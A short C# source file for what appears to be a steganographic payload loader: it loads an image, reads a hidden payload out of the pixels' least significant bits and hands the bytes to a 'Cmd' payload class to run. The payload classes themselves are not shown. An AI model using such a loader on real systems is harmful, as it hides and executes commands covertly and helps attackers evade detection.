using System.Drawing;

using Reader.Algorithms;
using Reader.Delivery;
using Reader.Payloads;

namespace Reader
{
    class Reader
    {
        static byte[] payload_data;

        static Bitmap bm;


        static IDelivery  del  = new Local();
        static IAlgorithm algs = new LsbX(1);
        static IPayload   pld  = new Cmd();

        static void Main(string[] args)
        {
            if (args.Length == 2)
            {
                int payload_bits = System.Int32.Parse(args[0]);
                payload_data = new byte[payload_bits / 8];

                bm = del.loadImage(args[1]);
                algs.readImage(bm, payload_data);
                pld.Run(payload_data);
            }
        }
    }
}
